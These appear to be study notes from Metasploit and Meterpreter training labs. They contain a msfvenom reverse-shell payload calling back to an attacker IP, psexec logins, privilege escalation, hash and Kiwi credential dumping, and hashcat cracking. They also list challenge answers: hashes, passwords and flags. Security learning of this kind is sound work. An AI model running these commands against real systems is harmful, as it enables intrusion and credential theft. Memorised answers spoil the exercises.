# Metasploit Framework (English Version)

This is a comprehensive summary of the Metasploit Framework, the primary tool used for scanning, exploiting, and performing post-exploitation tasks.

## 1. 🧠 Core Concepts

|**Command**|**Description**|
|---|---|
|**`msfconsole`**|The main command-line interface for Metasploit.|
|**Context**|The operational environment after using a module (e.g., `msf6 exploit(...) >`). Settings apply only to this module.|
|**`search [keyword]`**|Finds modules based on CVE, exploit name, or target platform.|
|**`use [module]`**|Selects a module to use.|
|**`info`**|Shows detailed information about the selected module.|
|**`show options`**|Displays all required and optional parameters for the current module (e.g., RHOSTS, LHOST, RPORT).|
|**`set [VAR] [VAL]`**|Sets a parameter value in the current context (e.g., `set RHOSTS 10.10.x.x`).|
|**`setg [VAR] [VAL]`**|Sets a **Global** parameter value, persisting across all modules until `msfconsole` is exited.|
|**`exploit` / `run`**|Executes the configured module.|
|**`back`**|Exits the current context and returns to the `msf6 >` prompt.|

## 2. 🗃️ Database Management

Metasploit uses a PostgreSQL database to store scan results, manage projects (Workspaces), and automate post-exploitation tasks.

|**Command**|**Function**|
|---|---|
|**`db_status`**|Checks the connection status to the database.|
|**`workspace`**|Lists, switches, or creates project workspaces (e.g., `workspace -a THM_Project`).|
|**`db_nmap [flags] [target]`**|Executes Nmap and automatically imports all results (hosts, ports, services) into the database.|
|**`hosts`**|Lists all discovered target IPs stored in the current workspace.|
|**`services`**|Lists all open ports and services discovered.|
|**`hosts -R`**|(Key Technique) Automatically pulls all stored IP addresses from the database and sets them as the `RHOSTS` parameter.|

## 3. 🛡️ Exploitation & Session Management

After a successful exploit, we gain a "Session" (a connection) to the target.

|**Command**|**Function**|
|---|---|
|**`sessions -l`**|(`-l` = list) Lists all active sessions.|
|**`^Z` (Ctrl+Z)** or **`background`**|"Backgrounds" the current session (e.g., `meterpreter >`) to return to the `msfconsole`.|
|**`sessions -i [ID]`**|(`-i` = interact) "Interacts" with a backgrounded session to bring it to the foreground (e.g., `sessions -i 1`).|
|**`sessions -k [ID]`**|(`-k` = kill) Kills a specific session.|

## 4. 🚀 Post-Exploitation

This details the complex workflow to "upgrade" a basic shell to Meterpreter, escalate privileges, and dump hashes.

|**Step**|**Command**|**Description/Result**|
|---|---|---|
|**1. Initial Exploit**|`exploit` (e.g., `ms17_010`)|We gain **Session 1** (a basic command Shell `C:\>`).|
|**2. Roadblock**|`reg save hklm\sam sam.hiv`|`ERROR: A required privilege is not held.` (Insufficient privileges).|
|**3. Background Shell**|`^Z` (Ctrl+Z) then `y`|Minimize Session 1 to return to the `msfconsole` prompt.|
|**4. Upgrade Shell**|`use post/multi/manage/shell_to_meterpreter`<br><br>  <br><br>`set SESSION 1`<br><br>  <br><br>`set LHOST [Our_IP]`<br><br>  <br><br>`run`|The upgrade module runs, opening **Session 2** (Meterpreter).|
|**5. Enter Meterpreter**|`sessions -i 2`|The prompt changes to `meterpreter >`.|
|**6. Privilege Escalation**|`getsystem`|Elevate privileges to `NT AUTHORITY\SYSTEM` (for Windows).|
|**7. Dump Hashes**|`hashdump` (Windows) or<br><br>  <br><br>`use post/linux/gather/hashdump` (Linux)|Dump all user hashes from the SAM file or /etc/shadow.|

**Answer (from the exercise):** The NTLM hash for `pirate` is `8ce9a3ebd1647fcc5e04025019f4b875`

## 5. 💣 Payload Generation (Msfvenom & Handler)

When not using a direct Exploit Module (e.g., an upload vulnerability), we must generate a payload with **Msfvenom** and configure the **Handler** manually.

|**Tool**|**Example Command**|**Function**|
|---|---|---|
|**Msfvenom**|`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=... -f elf -o shell.elf`|Creates the standalone payload file (ELF, EXE, PHP, ASP, etc.).|
|**Handler**|`use exploit/multi/handler`|The module used to act as the "Listener" to catch the incoming connection.|

**Msfvenom Workflow:**

1. **Generate Payload (Terminal 1):**
    
    Bash
    
    ```
    # Create an .elf file to connect back to our LHOST on LPORT 4444
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.4.10.128 LPORT=4444 -f elf -o shell.elf
    ```
    
2. **Set up Listener (Terminal 2 - msfconsole):**
    
    Bash
    
    ```
    msf6 > use exploit/multi/handler
    # (CRITICAL!) Set PAYLOAD, LHOST, LPORT to match the Msfvenom command
    msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 10.4.10.128
    msf6 exploit(multi/handler) > set LPORT 4444
    msf6 exploit(multi/handler) > run
    [*] Started reverse TCP handler...
    ```
    
3. **Transfer & Run (Terminal 3 & 4):**
    
    - Use a Python Web Server (`python3 -m http.server 9000`) to host the file.
        
    - On the victim, use `wget` to download `shell.elf`.
        
    - Run `chmod +x shell.elf` and `./shell.elf`.
        
4. **Catch Session (Back in Terminal 2):**
    
    - `[*] Meterpreter session 1 opened...`


-------------------------------------------------------------------------------------------
# Metasploit: Meterpreter

This is a comprehensive summary of the Metasploit: Meterpreter module (Tasks 1-5), including core concepts, commands, and the final post-exploitation challenge walkthrough.

## 1. Task 1: Introduction to Meterpreter

### 1.1 Core Concepts

**Meterpreter** is Metasploit's most advanced payload. It's not just a shell; it's a powerful agent that runs in the victim's memory, designed for stealth and flexibility.

- **In-Memory Execution:** Meterpreter resides entirely in the target's RAM and never writes itself to the hard disk. This helps evade basic antivirus (AV) software that scans files on disk.
    
- **Process Injection:** It doesn't run as its own process (e.g., `meterpreter.exe`). Instead, it "injects" itself into an existing, legitimate system process (like `spoolsv.exe` or `lsass.exe`).
    
- **Encrypted Communication:** All communication between you (the attacker) and the Meterpreter agent is encrypted (TLS), helping to hide commands from network intrusion detection systems (IDS/IPS).
    

### 1.2 Commands & Techniques

We can see process injection in action by comparing the output of `getpid` (Meterpreter's process ID) and `ps` (the process list).

ข้อมูลโค้ด

```
meterpreter > getpid 
Current pid: 1304

meterpreter > ps
Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 ...
 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 ...
 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 ...
```

> **Analysis:** `getpid` shows we are in PID `1304`, but the `ps` list shows PID `1304` is actually `spoolsv.exe`. This proves Meterpreter is hiding inside that legitimate process.

---

## 2. Task 2: Meterpreter Flavors

### 2.1 Core Concepts

Meterpreter comes in many "flavors" (versions) to fit different targets and scenarios.

1. **Staged (`/`) vs. Inline/Stageless (`_`):**
    
    - **Staged (e.g., `windows/x64/meterpreter/reverse_tcp`):** A small "stager" is sent first, which then connects back to download the full Meterpreter payload.
        
    - **Inline (e.g., `windows/x64/meterpreter_reverse_tcp`):** The entire payload is sent in one single file. It's larger but more stable.
        
2. Platform-Specific:
    
    There are Meterpreter versions for almost every OS and environment (Windows, Linux, OSX, PHP, Python, Java, Android, etc.).
    

### 2.2 Commands & Techniques

When using an exploit module, Metasploit will automatically select a default compatible payload. You can see all other compatible "flavors" using the `show payloads` command.

ข้อมูลโค้ด

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
...
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter...
...
```

---

## 3. Task 3: Meterpreter Commands

### 3.1 Core Concepts

Once you have a `meterpreter >` prompt, you have a powerful set of built-in commands. The `help` command is your best friend.

### 3.2 Commands & Techniques (Key Commands)

|**Category**|**Command(s)**|**Description**|
|---|---|---|
|**Core**|`help`, `background`, `exit`|Manage the session.|
|**File System**|`ls`, `pwd`, `cd`, `cat`, `search`|Navigate the victim's file system.|
||**`download`** / **`upload`**|(Critical) Transfer files between victim and attacker.|
|**System**|**`getuid`**|Check your current user privileges.|
||**`sysinfo`**|Get the victim's system information (OS, Computer Name).|
||**`ps`**|List running processes.|
||**`shell`**|Drop into a standard system shell (e.g., `C:\>`).|
|**Power**|**`getsystem`**|The most powerful command; attempts to escalate to `NT AUTHORITY\SYSTEM`.|
||**`hashdump`**|Dumps all NTLM password hashes (requires `SYSTEM` privileges).|
||`keyscan_start`, `screenshot`|Keylogger and screen capture.|

---

## 4. Task 4: Post-Exploitation Workflow

### 4.1 Core Concepts

This task demonstrates a standard workflow used by penetration testers _after_ getting a shell to ensure stability and escalate privileges.

### 4.2 Commands & Techniques

1. **Check Privileges:** Use `getuid` to see who you are.
    
2. **Find a Stable Process:** Use `ps` to find a high-privilege (`SYSTEM`), stable process (like `lsass.exe` or `winlogon.exe`).
    
3. **Migrate:** Use `migrate [PID]` to move Meterpreter into that stable process. This makes your session survive if the original process (like `spoolsv.exe`) crashes.
    
4. **Dump Hashes:** Once you are `SYSTEM` (using `getsystem` if needed), run `hashdump` to steal credentials.
    

ข้อมูลโค้ด

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > ps
...
 PID   PPID  Name                  User
 ---   ----  ----                  ----
 716   596   lsass.exe             NT AUTHORITY\SYSTEM
...

meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.

meterpreter > hashdump
Administrator:500:aad3...:31d6...
Jon:1000:aad3b...:ffb43...
...
```

---

## 5. Task 5: Advanced Post-Exploitation & Challenge

### 5.1 Core Concepts

Meterpreter's true power comes from its ability to load **extensions** using the `load` command. The most famous extension is **Kiwi** (Metasploit's version of the **Mimikatz** tool).

While `hashdump` gets NTLM _hashes_ (which must be cracked), `Kiwi` (e.g., the `creds_all` command) can often find **cleartext passwords** directly from the computer's memory.

ข้อมูลโค้ด

```
meterpreter > load kiwi
Loading extension kiwi...Success.

meterpreter > help
...
Kiwi Commands
=============
    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    ...
```

### 5.2 Challenge Q&A Walkthrough

We were given credentials (`ballen`:`Password1`) and tasked with finding multiple flags and hashes.

#### **Q: What is the computer name?**

**A: `ACME-TEST`**

Bash

```
# 1. Gain access with psexec and the provided credentials
msf6 > use exploit/windows/smb/psexec
msf6 exploit(...) > set RHOSTS [TARGET_IP]
msf6 exploit(...) > set SMBUser ballen
msf6 exploit(...) > set SMBPass Password1
msf6 exploit(...) > run
[*] Meterpreter session 1 opened...

# 2. Get system info
meterpreter > sysinfo
Computer        : ACME-TEST
...
```

#### **Q: What is the target domain?**

**A: `FLASH`**

Bash

```
# 3. Get system info (from the same command)
meterpreter > sysinfo
...
Domain          : FLASH
...
```

#### **Q: What is the name of the share likely created by the user?**

**A: `speedster`**

Bash

```
# 4. Use a post-exploitation module to find shares
# (You must background the session first)
meterpreter > background
msf6 exploit(...) > use post/windows/gather/enum_shares
msf6 post(...) > set SESSION 1
msf6 post(...) > run
...
[+] Found share: speedster (C:\Share)
...
# (Re-enter the session: sessions -i 1)
```

#### **Q: What is the NTLM hash of the jchambers user?**

**A: `69596c7aa1e8daee17f8e78870e25a5c`**

Bash

```
# 5. Escalate to SYSTEM privileges
meterpreter > getsystem
...got system...

# 6. Dump the hashes
meterpreter > hashdump
...
jchambers:1114:aad3...:69596c7aa1e8daee17f8e78870e25a5c:::
...
```

#### **Q: What is the cleartext password of the jchambers user?**

**A: `Trustno1`**

Bash

```
# 7. (On your Attacker machine, in a new terminal)
# 7a. Create the hash file
echo "69596c7aa1e8daee17f8e78870e25a5c" > hash.txt
# 7b. Crack it with Hashcat (Mode 1000 = NTLM)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
...
69596c7aa1e8daee17f8e78870e25a5c:Trustno1
...
```

#### **Q: Where is the "secrets.txt" file located?**

**A: `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`**

Bash

```
# 8. Search for the file on the victim
meterpreter > search -f secrets.txt
Found 1 result...
    c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

#### **Q: What is the Twitter password revealed in the "secrets.txt" file?**

**A: `KDSvbsw3849!`**

Bash

```
# 9. Read the file (use " " because of the spaces in the path)
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
My Twitter password is KDSvbsw3849!
```

#### **Q: Where is the "realsecret.txt" file located?**

**A: `c:\inetpub\wwwroot\realsecret.txt`**

Bash

```
# 10. Search for the next file
meterpreter > search -f realsecret.txt
Found 1 result...
    c:\inetpub\wwwroot\realsecret.txt
```

#### **Q: What is the real secret?**

**A: `The Flash is the fastest man alive`**

Bash

```
# 11. Read the final file
meterpreter > cat c:\inetpub\wwwroot\realsecret.txt
The Flash is the fastest man alive
```

# Cheat Sheet: Metasploit Meterpreter 

This is a summary of the key techniques (workflows) and commands used in the Meterpreter module.

## 1. Methods & Workflows

These are the step-by-step processes you performed in this module.

### Workflow: Gaining Access with `psexec` (Known Credentials)

- **Goal:** Use known credentials (Username/Password) to authenticate to a target and open a Meterpreter session.
    
- **Steps:**
    
    1. `msfconsole`
        
    2. `use exploit/windows/smb/psexec`
        
    3. `set payload windows/x64/meterpreter/reverse_tcp`
        
    4. `set RHOSTS [Victim_IP]`
        
    5. `set LHOST [Attacker_IP]`
        
    6. `set SMBUser [Known_User]` (e.g., `ballen`)
        
    7. `set SMBPass [Known_Pass]` (e.g., `Password1`)
        
    8. `run`
        
    9. (Result) `meterpreter >`
        

### Workflow: Upgrading a Shell (Shell to Meterpreter)

- **Goal:** Upgrade a basic, low-privilege/limited shell to a full-featured Meterpreter session.
    
- **Steps:**
    
    1. (In basic shell `C:\>`) `^Z` (Ctrl+Z) -> Press `y` (to background Session 1)
        
    2. (In `msfconsole`) `use post/multi/manage/shell_to_meterpreter`
        
    3. `set SESSION 1` (Select the shell to upgrade)
        
    4. `set LHOST [Attacker_IP]`
        
    5. `set LPORT [New_Port]` (e.g., `4434`)
        
    6. `run`
        
    7. (Result) `[*] Meterpreter session 2 opened...`
        
    8. `sessions -i 2` (Interact with the new session)
        
    9. (Result) `meterpreter >`
        

### Workflow: Dumping Hashes (Hashdump)

- **Goal:** Steal all NTLM password hashes from the victim machine.
    
- **Steps:**
    
    1. (In `meterpreter >`) `getuid` (Check privileges)
        
    2. (If not `SYSTEM`) `getsystem` (Escalate privileges)
        
    3. (Once `SYSTEM`) `hashdump`
        
    4. (Result) `jchambers:1114:...:69596c7aa1e8daee17f8e78870e25a5c:::`
        

### Workflow: File Hunting (Search & Cat)

- **Goal:** Find flag files or sensitive data.
    
- **Steps:**
    
    1. (In `meterpreter >`) `search -f secrets.txt`
        
    2. (Result) `Found 1 result... c:\...`
        
    3. `cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"` (Use `"` for paths with spaces)
        
    4. (Result) `My Twitter password is KDSvbsw3849!`
        

### Workflow: Cracking Hashes (Password Cracking)

- **Goal:** Convert the stolen NTLM hash into a cleartext password.
    
- **Steps:**
    
    1. (Open a **new terminal** on your Attacker machine)
        
    2. `echo "69596c7aa1e8daee17f8e78870e25a5c" > hash.txt`
        
    3. `hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt`
        
    4. (Result) `69596c7aa1e8daee17f8e78870e25a5c:Trustno1`
        

---

## 2. Key Commands

| Command (in Meterpreter)       | Prerequisite(s)                          | Description / Function                                           |
| ------------------------------ | ---------------------------------------- | ---------------------------------------------------------------- |
| **`getuid`**                   | -                                        | "Who am I?" (Checks the user the session is running as)          |
| **`sysinfo`**                  | -                                        | "Where am I?" (Gets Computer Name, Domain, OS)                   |
| **`getsystem`**                | (Usually requires initial admin rights)  | Attempts to escalate privileges to `NT AUTHORITY\SYSTEM`         |
| **`hashdump`**                 | Must successfully run `getsystem` first  | Dumps all NTLM hashes from the SAM database                      |
| **`load kiwi`**                | -                                        | Loads the "Kiwi" extension (Mimikatz) for advanced commands      |
| **`creds_all`**                | Must `load kiwi` first                   | (Alternative) Tries to dump "cleartext" passwords from memory    |
| **`migrate [PID]`**            | Run `ps` first to find a target PID      | Moves Meterpreter into another process (for stability)           |
| **`ps`**                       | -                                        | Lists all running processes on the victim machine                |
| **`search -f [filename]`**     | -                                        | Searches for a file (e.g., `search -f secrets.txt`)              |
| **`cat [path]`**               | Must know the exact path (from `search`) | Reads the content of a file (Use `"..."` if the path has spaces) |
| **`download [victim_path]`**   | -                                        | Downloads a file from the victim to your attacker machine        |
| **`upload [attacker_path]`**   | -                                        | Uploads a file from your attacker machine to the victim          |
| **`background`** (or `Ctrl+Z`) | -                                        | "Backgrounds" the session to return to the `msfconsole`          |
## 3. Choosing Your Technique (Situational Guide)

This table summarizes "When you find X... you should use Y."

|**🧠 Situation**|**🚀 Recommended Technique**|**🎯 Goal**|
|---|---|---|
|I have **valid credentials** (e.g., `ballen`:`Password1`).|Use **`exploit/windows/smb/psexec`**.|Authenticate directly to get a Meterpreter session.|
|I scanned and found `MS17-010 VULNERABLE` (no password).|Use **`exploit/windows/smb/ms17_010_eternalblue`**.|Get an unauthenticated initial shell.|
|I have a basic shell (`C:\>`), **not Meterpreter**.|Use **`post/multi/manage/shell_to_meterpreter`**.|"Upgrade" the basic shell into a full Meterpreter.|
|I have Meterpreter and `getuid` shows **`SYSTEM`**.|Use **`hashdump`**.|Immediately "steal" all NTLM hashes from the SAM.|
|`hashdump` only gave me hashes, I want **cleartext passwords**.|Use **`load kiwi`** -> **`creds_all`**.|"Dump" cleartext passwords directly from memory (LSASS).|
|I found a **file upload vulnerability** on a website (e.g., PHP).|Use **`msfvenom`** + **`exploit/multi/handler`**.|Create a custom payload (e.g., `shell.php`), upload it, and "catch" the connection.|
|I have Meterpreter, but `getuid` shows a **low-privilege user**.|Use **`getsystem`**.|Attempt "Privilege Escalation" to become `SYSTEM`.|
|My session is in an unstable process (e.g., `spoolsv.exe`).|Use **`ps`** (to find a PID) -> **`migrate [PID]`**.|"Migrate" Meterpreter to a more stable process (like `lsass.exe`).|
